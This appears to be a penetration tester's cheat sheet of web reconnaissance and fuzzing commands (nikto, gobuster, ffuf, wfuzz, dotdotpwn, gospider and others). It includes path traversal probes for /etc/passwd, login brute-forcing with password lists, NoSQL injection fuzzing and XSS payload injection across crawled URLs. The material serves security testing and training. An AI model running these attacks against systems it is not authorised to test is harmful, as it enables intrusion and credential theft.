nikto -C all -h 192.168.1.1 -p 80
nikto -C all -h 192.168.1.1 -p 443


nikto -h $IP -p $PORT



## ---------------------------------------------------- ##
##   [+] Proxy Enumeration (useful for open proxies)
## ---------------------------------------------------- ##
nikto -useproxy http://$IP:3128 -h $IP



nikto -Option USERAGENT=Mozilla -url=http://$IP  -o nikto.txt

nikto -port 80,443 -host $IP -o -v nikto.txt

nikto -host $IP -C all -p 80 -output $File.txt | grep -v Cookie


nikto -h $Domain -port 443 -Format htm --output $Domain.htm



## performing nikto webscan on port $port... 
nikto -host $target:$port -Format txt -output $logfile



nikto -host $1 -port $2 -nossl -output $File.html -useragent "$3"



## ------------------------------------------------------------------- ##
##   [?] Please provide the target protocol scheme (http or https)
##   [?] target IP address or hostname, the target port
##   [?] the user agent string and the proxy server.
## ------------------------------------------------------------------- ##
nikto -ask=no -h $1://$2:$3 -output $1_$2_$3_nikto.html -useragent $4 -useproxy $5 2>&1 | tee $1_$2_$3_nikto.txt



nikto -ask=no -h $1://$2:$3 -output $1_$2_$3_nikto.html -useproxy $4 2>&1 | tee $1_$2_$3_nikto.txt



nikto -ask=no -h $1://$2:$3 -output $1_$2_$3_nikto.html 2>&1 | tee "$1_$2_$3_nikto.txt"


##-================================-##
##   [+] Nikto - Use Squid Proxy
##-================================-##
nikto -h $IP -useproxy http://$IP:4444




##-========================================-##
##   [+] VHostScan - VHost
##-========================================-##
VHostScan -v -t $IP -p $Port -w /root/lists/Web/virtual_host_scanning.txt --no-lookups --user-agent $UserAgent -oN $OutFile



--waf	            If set then simple WAF bypass headers will be sent

--rate-limit

--fuzzy-logic	



##-================================-##
##   [+] VHostBrute - VHost 
##-================================-##
vhostbrute.py --url="$Domain" --remoteip="$IP" --base="$Domain" --vhosts="vhost_full.list"



##-========================================-##
##   [+] GoBuster - VHost
##-========================================-##
gobuster vhost -u $Domain -t 50 -w $SubDomains.txt
gobuster vhost -u $URL -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200


##-========================================-##
##   [+] FFUF - VHost 
##-========================================-##
ffuf -c -w /$Dir/ -u $Domain -H "Host: FUZZ.$Domain"



##-========================================-##
##   [+] FFUF - VHost 
##-========================================-##
ffuf -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --hc 400,404,403 -H "Host: FUZZ.$Domain" -u $Domain -t 100 -u $Domain -H "Host: FUZZ.$Domain"








Cross Origin Resource Sharing (CORS)


##-========================================-##
##   [+] FFUF - CORS Bruteforcing
##-========================================-##
## ---------------------------------------------------------------------------- ##
##   [?] Find pages that only return the header Access-Control-Allow-Origin 
##       when a valid domain is set in the origin header
##   [?] Abuse CORS behavior - discover new subdomains
## ---------------------------------------------------------------------------- ##
ffuf -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u $IP -H 'Origin: http://FUZZ.crossfit.htb' -mr "Access-Control-Allow-Origin" -ignore-body




 --hc 400,404,403 -H "Host: FUZZ.$Domain" -u $Domain -t 100 -u $Domain -H "Host: FUZZ.$Domain"











httrack $Domain/$File.html --spider -P proxy.myhost.com:8080

httrack $Domain/$File.html --spider -P 10.8.0.1:1080
httrack $Domain/$File.html --spider -P 10.64.0.1:1080
--verbose
--urllist					##
--mirror $URLs
-*p3   ## save all files
--debug-headers					##
--user-agent					##

--single-log			## -f2    one single log file
--file-log				## -f     *log in files
--debug-log				##
--extra-log				## -z     log - extra infos

--debug-xfrstats				## -#T    generate transfer ops. log every minutes
--debug-ratestats				## -#Z    generate transfer rate statictics every minutes

--debug-parsing					## -#d    debug parser

--debug-cache					## -#C    cache list




## --------------------------------------------- ##
##   [?] print request and response headers
##   [?] request headers + response headers
## --------------------------------------------- ##
http -p Hh $Domain


## --------------------------------------------- ##
##   [?] print request and response headers
##   [?] request headers + response headers
##   [?] follow redirects
##   [?] skip SSL verification
## --------------------------------------------- ##
http -p Hh $Domain --follow --verify no


## --------------------------------------------- ##
##   [?] Use Proxy For connection
## --------------------------------------------- ##
http -p Hh $Domain --follow --verify no --proxy http:http://127.0.0.1:16379


##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] DotDotPwn - Fuzzing + Web Vulnerability Scanner
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



## --------------------------------------------------------------------------------------------- ##
##  [+] DotDotPwn - fuzzer to discover traversal directory vulnerabilities (HTTP/FTP/TFTP)
## --------------------------------------------------------------------------------------------- ##


## ------------------------------------------------------------------------------------------------------------------------------------- ##
      dotdotpwn.pl -m $Module -h $Host
## ------------------------------------------------------------------------------------------------------------------------------------- ##




## ------------------------------------------------------------------------------------------------------------------------------------- ##
      dotdotpwn -m		##  [?]> Module [http | http-url | ftp | tftp | payload | stdout]
## ------------------------------------------------------------------------------------------------------------------------------------- ##
      dotdotpwn -h		##  [?]> Hostname
## ------------------------------------------------------------------------------------------------------------------------------------- ##
      dotdotpwn -O		##  [?]> Operating System detection For intelligent fuzzing (nmap)
## ------------------------------------------------------------------------------------------------------------------------------------- ##
      dotdotpwn -o		##  [?]> Operating System Type if known ("windows", "unix" or "generic")
## ------------------------------------------------------------------------------------------------------------------------------------- ##
      dotdotpwn -s		##  [?]> Service version detection (banner grabber)
## ------------------------------------------------------------------------------------------------------------------------------------- ##
      dotdotpwn -d		##  [?]> Depth of traversals (e.g. deepness 3 equals to ../../../; default: 6)
## ------------------------------------------------------------------------------------------------------------------------------------- ##
      dotdotpwn -E		##  [?]> Add @Extra_files On TraversalEngine.pm (e.g. web.config, httpd.conf, etc.)
## ------------------------------------------------------------------------------------------------------------------------------------- ##
      dotdotpwn -S		##  [?]> Use SSL For HTTP and Payload module (not needed For http-url, use a https:// url instead)
## ------------------------------------------------------------------------------------------------------------------------------------- ##
      dotdotpwn -u		##  [?]> URL with the part to be fuzzed marked as TRAVERSAL (e.g. http://foo:8080/id.php?x=TRAVERSAL&y=31337)
## ------------------------------------------------------------------------------------------------------------------------------------- ##
      dotdotpwn -k		##  [?]> Text pattern to match On the response (http-url & payload modules - e.g. "root:" if trying /etc/passwd)
## ------------------------------------------------------------------------------------------------------------------------------------- ##
      dotdotpwn -x		##  [?]> Port to connect (default: HTTP=80; FTP=21; TFTP=69)
## ------------------------------------------------------------------------------------------------------------------------------------- ##
      dotdotpwn -X		##  [?]> Use the Bisection Algorithm to detect the exact deepness once a vulnerability has been found
## ------------------------------------------------------------------------------------------------------------------------------------- ##
      dotdotpwn -e		##  [?]> File extension appended at the end of each fuzz string (e.g. ".php", ".jpg", ".inc")
## ------------------------------------------------------------------------------------------------------------------------------------- ##
      dotdotpwn -U		##  [?]> Username (default: 'anonymous')
## ------------------------------------------------------------------------------------------------------------------------------------- ##
      dotdotpwn -P		##  [?]> Password (default: 'dot@dot.pwn')
## ------------------------------------------------------------------------------------------------------------------------------------- ##
      dotdotpwn -M		##  [?]> HTTP Method to use when using the 'http' module [GET | POST | HEAD | COPY | MOVE] (default: GET)
## ------------------------------------------------------------------------------------------------------------------------------------- ##
      dotdotpwn -r		##  [?]> Report filename (default: 'HOST_MM-DD-YYYY_HOUR-MIN.txt')
## ------------------------------------------------------------------------------------------------------------------------------------- ##
      dotdotpwn -b		##  [?]> Break after the first vulnerability is found
## ------------------------------------------------------------------------------------------------------------------------------------- ##
      dotdotpwn -q		##  [?]> Quiet mode (doesnt print each attempt)
## ------------------------------------------------------------------------------------------------------------------------------------- ##
      dotdotpwn -C		##  [?]> Continue If no data was received from host
## ------------------------------------------------------------------------------------------------------------------------------------- ##




## --------------------------------------------- ##
##   [?] Traverse a path:
## --------------------------------------------- ##
$Domain/../../../etc/passwd):


##-======================-##
##    [+] DotDotPwn - 
##-======================-##
dotdotpwn -q -m http -S -o windows -f /windows/win.ini -k mci -h $Domain


##-======================-##
##    [+] DotDotPwn - 
##-======================-##
dotdotpwn -q -m http -o unix -f /etc/passwd -k root -h $Domain


##-======================-##
##    [+] DotDotPwn - 
##-======================-##
dotdotpwn -q -m http-url -o unix -f /etc/hosts -k localhost -u 'https://$Domain/index.php?file=TRAVERSAL'



## --------------------------------------------- ##
##   [?] Try pre-pending protocol
## --------------------------------------------- ##
##   [?] file:// gopher:// dict://
##        php:// jar:// ftp:// tftp://
## --------------------------------------------- ##
##   [?] to the file path;
## --------------------------------------------- ##
##   [?] file://TRAVERSAL.
## --------------------------------------------- ##



RFC 959 (FTP): Respose code for a successful GET
RFC 959 (FTP): Respose code for a successful CWD (250)
RFC 959 (FTP): Respose code for a successful GET (226)





## ------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?] RouterSploit - Exploitation Framework for Embedded Devices
## ------------------------------------------------------------------------------------------------------------------------------------- ##
##         --> https://github.com/threat9/routersploit
## ------------------------------------------------------------------------------------------------------------------------------------- ##



## -------------------------------------------------- ##
##    [?] WebSploit - Web Exploitation Framework
## -------------------------------------------------- ##
## 
## -------------------------------------------------- ##
##    [?] BeEF - 
## -------------------------------------------------- ##
## 
## ------------------------------------------------------------------------------------------ ##
##    [?] Burp Suite - Web Application Attack Surface Analysis & Attack Surface Mapping
## ------------------------------------------------------------------------------------------ ##
## 
## -------------------------------------------------------------------------- ##
##    [?] cisco-auditing-tool - Scans Cisco routers for vulnerabilities
## -------------------------------------------------------------------------- ##





##-=======================================-##
##   [+] Gather all urls, send to burp:
##-=======================================-##
cat hosts | sed 's/https\?:\/\///' | gau > urls.txt

cat urls.txt | grep -P "\w+\.js(\?|$)" | sort -u > jsurls.txt

ffuf -mc 200 -w jsurls.txt:HFUZZ -u HFUZZ -replay-proxy http:127.0.0.1:8080
 
 
 






##    [?] Payload Module
# by nitr0us (nitrousenador@gmail.com)
# http://chatsubo-labs.blogspot.com
#
# This module takes the text file passed as a parameter (-p filename),
# replaces the 'TRAVERSAL' token within the file by the traversal
# fuzz patterns and sends the payload (file content + fuzz patterns)
# to the target (-h switch) in the specified port (-x switch).
# (e.g. a file that contains an HTTP request including cookies, 
# session ids, variables, etc. and the 'TRAVERSAL' tokens within the
# request that will be fuzzed)





##-=================================================-##
##   [+] DotDotPwn - Directory Traversal Fuzzer
##-=================================================-##
## ---------------------------------------------------------------- ##
##   [?] Fuzzer to discover traversal directory vulnerabilities
## ---------------------------------------------------------------- ##




dotdotpwn.pl -m http -h $IP -M GET -o unix
dotdotpwn.pl -m http -h 192.168.1.1 -M GET








dotdotpwn.pl -m %s -u %s -h %s -k %s -f %s -d %s -o %s -x %s -t 1 -q -C -b
dotdotpwn.pl -m %s -u %s -h %s -k %s -f %s -d %s -o %s -x %s -t 1 -e %s -q -C -b

dotdotpwn.pl -m http -h %s -k %s -f %s -d %s -o %s -x %s -t 1 -q -C -b
dotdotpwn.pl -m http -h %s -k %s -f %s -d %s -o %s -x %s -t 1 -e %s -q -C -b



[+] Total Traversals found: 





CXSecurity, ZeroDay, Vulners, National
Vulnerability Database, WPScan Vulnerability Database




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Dirb - Web Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


## ------------------------------- ##
##  [+] Dirb - URL Brute Force:
## ------------------------------- ##
## 
## ------------------------------------------------------------------------------------------------ ##
    dirb http://$IP -r -o dirb-$IP.txt
## -------------------------------------------------------------------------------------------------------------------- ##
    dirb http://"$1"/ | tee /tmp/results/$1/$1-dirb-$port.txt
## -------------------------------------------------------------------------------------------------------------------- ##
    dirb http://$IP/ /usr/share/wordlist/dirb/big.txt
## -------------------------------------------------------------------------------------------------------------------- ##
    dirb http://$host:$port/ /usr/share/dirb/wordlists/big.txt -a \"$2\" -o dirb-results-http-$host-$port.txt -f 
    dirb https://$host:$port/ /usr/share/dirb/wordlists/big.txt -a \"$2\" -o dirb-results-https-$host-$port.txt -f
## -------------------------------------------------------------------------------------------------------------------- ##



##-======================================-##
##   [+] Dirb - 
##-======================================-##
dirb $URL $File -a $UserAgent -b -f -S


##-======================================-##
##   [+] Dirb - 
##-======================================-##
dirb $URL $Wordlist -a $UserAgent -b -f -S






list-urls.py $Domain




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##    [+] WFuzz - Web Application Bruteforcer + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


## ---------------------------------------- ##
##    [?] wfuzz -z payload,params $URL
## ---------------------------------------- ##
wfuzz -v verbose     ## Verbose 
wfuzz -p $Addr       ## (proxy)
wfuzz -t $Num        ## number of concurrent connections
wfuzz -s $Num        ## delay between requests
wfuzz -R $Depth      ## Recursion level
wfuzz -L             ## follow HTTP redirections
wfuzz -u $URL        ## URL for request
wfuzz -z $Payload    ## Payload for each FUZZ keyword used
wfuzz -w $File       ## specify a wordlist file (alias for -z file,payload)
wfuzz -V alltype     ## All parameters bruteforcing
wfuzz -x $Method     ## HTTP method for request



##-========================================-##
##    [+] Wfuzz - 
##-========================================-##
wfuzz -v -t $Threads -L --hc 404 -w $Wordlist -u $URL -f $File



##-========================================-##
##    [+] Wfuzz - The web brute forcer
##-========================================-##
wfuzz -c -z $File.txt --sc 200 http://$IP


##-=========================================-##
##   [+] WFuzz - Bruteforce web parameter
##-=========================================-##
wfuzz -u http://$IP/path/index.php?param=FUZZ -w /usr/share/wordlists/rockyou.txt


##-============================================-##
##   [+] WFuzz - Bruteforce post data (login)
##-============================================-##
wfuzz -u http://$IP/path/index.php?action=authenticate -d 'username=admin&password=FUZZ' -w /usr/share/wordlists/rockyou.txt

wfuzz -c -z file,users.txt -z file,pass.txt -d "name=FUZZ&password=FUZ2Z" --sc 200 --hh 206 -t 200 $URL/login.php


##-================================================-##
##   [+] WFuzz - 
##-================================================-##
wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $IP:60080/?FUZZ=test


##-================================================-##
##   [+] WFuzz - 
##-================================================-##
wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $IP:60080/?page=FUZZ


##-================================================-##
##   [+] WFuzz - 
##-================================================-##
wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$IP:60080/?page=mailer&mail=FUZZ"


##-================================================-##
##   [+] WFuzz - 
##-================================================-##
wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $IP/FUZZ


##-========================================-##
##   [+] WFuzz - Fuzz Files:
##-========================================-##
wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/raft-medium-files.txt --hc 404 -t 200 -f $Dir/$WFuzzFiles.out $IP/FUZZ


##-========================================-##
##   [+] WFuzz - Fuzz Directories:
##-========================================-##
wfuzz -c -z /usr/share/seclists/Discovery/Web_Content/raft-medium-files.txt --hc 404 -t 200 -f $Dir/$WFuzzDirs.out "$URL/FUZZ"


##-================================================-##
##   [+] WFuzz - 
##-================================================-##
wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $IP/FUZZ


##-======================================-##
##   [+] WFuzz - SubDomain Bruteforce
##-======================================-##
wfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hl 7 -t 200 -u "$URL" -H "Host: FUZZ.$domain"


##-================================================-##
##   [+] WFuzz - 
##-================================================-##
wfuzz -z file,usr/share/wordlists/nosqli -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d "{\"coupon_code\":FUZZ} http://crapi.apisec.ai/community/api/v2/coupon/validate-coupon" --sc 200



##-================================================-##
##   [+] WFuzz - Fuzz DNS using wfuzz - hide 404
##-================================================-##
wfuzz -H 'Host: FUZZ.site.com' -w $File -u $Domain --hh $RemoveString -hc 404


##-=================================-##
##   [+] NMap - HTTP Form Fuzzer  
##-=================================-##
nmap --script http-form-fuzzer --script-args 'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}' -p 80 $IP




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] ffuf - Fuzzing + Web Vulnerability Scanner
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-===============================-##
##   [+] ffuf - FUZZ parameters
##-===============================-##
## ------------------------------------------------------- ##
##    [?] dont forget to include LFI or RFI statements
## ------------------------------------------------------- ##
ffuf -u "$URL/?FUZZ=1" -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fw 39 -t 200

for i in {0..255}; do echo $i; done | ffuf -u '$URL?id=FUZZ' -c -w - -fw 33 -t 200 -o recon/sequence.md




##-===============================-##
##   [+] ffuf - Fuzz For Files
##-===============================-##
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -t 200 -f recon/wfuzz-files.out "$URL/FUZZ" 


##-======================================-##
##   [+] ffuf - Change Request Method
##-======================================-##
ffuf -c -t 200 -fs 50,182 -u "$URL/FUZZ/" -w /usr/share/wordlists/dirb/big.txt -o recon/ffuf-post_method.md -t 200 -X POST


##-====================================-##
##   [+] ffuf - FUZZ File Extensions
##-====================================-##
ffuf -u $URL/indexFUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -o recon/ffuf-ext.md -t 200


ffuf -c -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -e .sh,.cgi,.pl,.py -fc 404 -t 200 -o recon/ffuf-extensions.md


##-================================-##
##   [+] ffuf - Fuzz Directories
##-================================-##
ffuf -c -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 200 -o recon/ffuf.md





##-==================================-##
##   [+] ffuf - Directory Fuzzing
##-==================================-##
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ


##-==================================-##
##   [+] ffuf - Extension Fuzzing
##-==================================-##
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ


##-=============================-##
##   [+] ffuf - Page Fuzzing
##-=============================-##
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php


##-==================================-##
##   [+] ffuf - Recursive Fuzzing
##-==================================-##
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v


##-===================================-##
##   [+] ffuf - Sub-domain Fuzzing
##-===================================-##
ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/


##-==============================-##
##   [+] ffuf - VHost Fuzzing
##-==============================-##
ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx


##-=======================================-##
##   [+] ffuf - Parameter Fuzzing - GET
##-=======================================-##
ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx


##-========================================-##
##   [+] ffuf - Parameter Fuzzing - POST
##-========================================-##
ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx


##-=============================-##
##   [+] ffuf - Value Fuzzing
##-=============================-##
ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx







##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Dirb - Web Directory Fuzzing
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


## --------------------------------------- ##
##   [?] Please provide the following:
##       > Target URL Base
##       > User Agent String
##       > Proxy Host and Port
## --------------------------------------- ##
dirb $1 /usr/share/seclists/Discovery/Web-Content/big.txt -a $2 -l -r -S -o $LOGNAME -p $3:$4


dirb $1 /usr/share/seclists/Discovery/Web-Content/big.txt -l -r -S -o $LOGNAME




dirsearch -b -u $1 -t 16 -r -E -f -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --plain-text-report=$LOGNAME


dirsearch -b -u $1 -t 16 -r -E -f -w /usr/share/seclists/Discovery/Web-Content/big.txt --plain-text-report=$LOGNAME


##-======================================-##
##   [+] Dirb - Directory Fuzzing:
##-======================================-##
dirb $Domain /usr/share/wordlists/dirb/big.txt -o $File.txt



## --------------------------------------- ##
##   [?] Please provide the following:
##       > Target URL
##       > User Agent String
##       > HTTP code to ignore
## --------------------------------------- ##
dirb $1 /usr/share/seclists/Discovery/Web-Content/big.txt -a $2 -l -r -S -o $LOGNAME -f -N $3




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] GoBuster - Web Directory Fuzzing
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


##-============================-##
##   [+] Web Servers Recon:
##-============================-##

gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://$IP:80 -o recon/gobuster_10.10.10.48_80.txt
nikto -host $IP:80 | tee recon/nikto-$IP-80.txt



##-======================================-##
##   [+] GoBuster - Directory Fuzzing:
##-======================================-##
## ------------------------------------------------------------------------------------------------ ##
gobuster -u $Domain -w /usr/share/wordlists/dirb/big.txt -t 100
gobuster -u http://$TARGET -w /usr/share/wordlists/dirb/big.txt -t 100
## ------------------------------------------------------------------------------------------------ ##
gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt
gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/common.txt
## ------------------------------------------------------------------------------------------------ ##


## ----------------------------------------------- ##
##  [?] A for loop so you can go do other stuff
## ----------------------------------------------- ##
for wordlist in $(ls);do gobuster -u $Domain -w $File -t 100;done


## ------------------------------------------------------------------------------------------------------------------------- ##
    gobuster -w /usr/share/wordlists/dirb/common.txt -u http://$IP/
## ------------------------------------------------------------------------------------------------------------------------- ##
    gobuster -u http://$IP/  -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
    gobuster -u http://$IP/ -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s '200,204,403,500' -e
## ------------------------------------------------------------------------------------------------------------------------- ##
    gobuster dir -u http://$IP/ -w $File.txt
    gobuster dir -u https://$IP -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 50 -k -o gobuster
## ------------------------------------------------------------------------------------------------------------------------- ##
    recursebuster -u $Domain -w wordlist.txt
## ------------------------------------------------------------------------------------------------------------------------- ##
    gobuster -u http://$IP/ -w /usr/share/wordlist/dirb/big.txt -s '200,204,301,302,307,403,500' -e
## ------------------------------------------------------------------------------------------------------------------------- ##



##-==========================================================-##
##   [+] bruteforce webdirectories and files by extention
##-==========================================================-##
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 30



##-=====================================-##
##   [+] Gobuster - Subdomain Brute:
##-=====================================-##
gobuster -m dns -u $Domain -w $File -t 50


##-=====================================-##
##   [+] Gobuster - 
##-=====================================-##
gobuster dir -u $1 -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -z -k -l -o $LOGNAME


##-=====================================-##
##   [+] Gobuster - 
##-=====================================-##
gobuster $dir -a $user_agent -t $threads -e -q -r -s $dirStatusCodes -u $url -x $FILE_EXT -l -w $wordlist -o $scanname -k




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] GoSpider - 
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



## ----------------------------------------------------- ##
##   [?] https://github.com/jaeles-project/gospider
## ----------------------------------------------------- ##
gospider -S websites.txt --js -t 20 -d 2 --sitemap --robots -w -r > urls.txt




xargs -P 500 -a pay -I@ sh -c 'nc -w1 -z -v @ 443 2>/dev/null && echo @' | xargs -I@ -P10 sh -c 'gospider -a -s "https://@" -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s#\] \- #\n#g" | anew'


Single target
gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'


gospider -S URLS.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt


##-=================================================================-##
##   [+] gospider - Injection xss using qsreplace to urls filter
##-=================================================================-##
gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'



gospider -S database/lives.txt -d 10 -c 20 -t 50 -K 3 --no-redirect --js -a -w --blacklist ".(eot|jpg|jpeg|gif|css|tif|tiff|png|ttf|otf|woff|woff2|ico|svg|txt)" --include-subs -q -o .tmp/gospider 2> /dev/null | anew -q .tmp/gospider.list


Filtering duplicate and common endpoints

cat .tmp/gospider.list .tmp/gau.list .tmp/waybackurls.list 2> /dev/null | sed '/\[/d' | grep $DM | sort -u | uro | anew -q database/urls.txt 



# Crawling using gospider
	echo  "[+] Crawling for js files using gospider"
	gospider -S "subs/filtered_hosts.txt" --js -t 50 -d 3 --sitemap --robots -w -r > "subs/gospider.txt"

	# Extracting subdomains from JS Files
	echo  "[+] Extracting Subdomains......"
	sed -i '/^.\{2048\}./d' "subs/gospider.txt"
	cat "subs/gospider.txt" | grep -o 'https?://[^ ]+' | sed 's/]$//' | unfurl -u domains | grep "$target_domain" | sort -u > "subs/scrap_subs.txt"
	rm "subs/gospider.txt"



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] ParamSpider - Parameter Spider
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


##-========================================-##
##   [+] ParamSpider - 
##-========================================-##
paramspider -d $Domain

##-========================================-##
##   [+] ParamSpider - URLs From File
##-========================================-##
paramspider -l $File


##-========================================-##
##   [+] ParamSpider - Proxy
##-========================================-##
paramspider -d $Domain --proxy '127.0.0.1:7890'


##-========================================-##
##   [+] ParamSpider - Placeholder
##-========================================-##
paramspider -d $Domain -p '><h1>relection</h1>'


##-======================================-##
##   [+] ParamSpider - Hunt For URLS
##-======================================-##
python3 paramspider.py --domain $Domain --exclude woff,png,svg,php,jpg --output /$Dir/$File.txt




##-========================================-##
##   [+] DirSearch - Directory Fuzzing:
##-========================================-##
dirsearch -u http://$IP/ -e .php


##-=============================================-##
##   [+] Webr00t - Directory Bruteforce Tool
##-=============================================-##
perl Webr00t.pl -h 172.31.2.47 -v | grep -v "404 Not Found"



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] WhatWeb - 
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



## --------------------------------------------------------------------- ##
##   [?] Provide the protocol scheme (http or https):
##   [?] The target server (IP address, hostname or URI) and the port:
## --------------------------------------------------------------------- ##
whatweb --color=never --no-errors -a 3 -v $1://$2:$3 2>&1 | tee "$1_$2_$3_whatweb.txt"


##-=================================================================-##
##   [+] WhatWeb - Fingerprinting on $Target & $Port
##-=================================================================-##
whatweb -a3 --color never http://$Target:$Port --log-brief $LogFile



whatweb -v $Domain > data/$file_/analysis/dynamic/domain_info.txt


## --------------------------------------- ##
##   [?] identifies all known services
## --------------------------------------- ##
whatweb $IP

whatweb $IP:80 --color=never --log-brief="whattheweb.txt"


##-======================================-##
##  [+] whatweb - Pulling plugins data
##-======================================-##
whatweb --info-plugins -t 50 -v $Domain >> $File.txt


##-=============================================-##
##  [+] whatweb - Running whatweb on $Domain
##-=============================================-##
whatweb -t 50 -v $Domain >> $File.txt


##-=============================================-##
##  [+] whatweb - 
##-=============================================-##
whatweb -i $URLs -u $UserAgent -a 3 -v --log-xml $Log.xml




##-========================================-##
##    [+] dirsearch - HTTP Enumeration
##-========================================-##
dirsearch big.txt -e sh,txt,htm,php,cgi,html,pl,bak,old



dirsearch -u $Domain -e php


for host in `cat alive.txt`; do
    DIRSEARCH_FILE=$(echo $host | sed -E 's/[\.|\/|:]+/_/g').txt
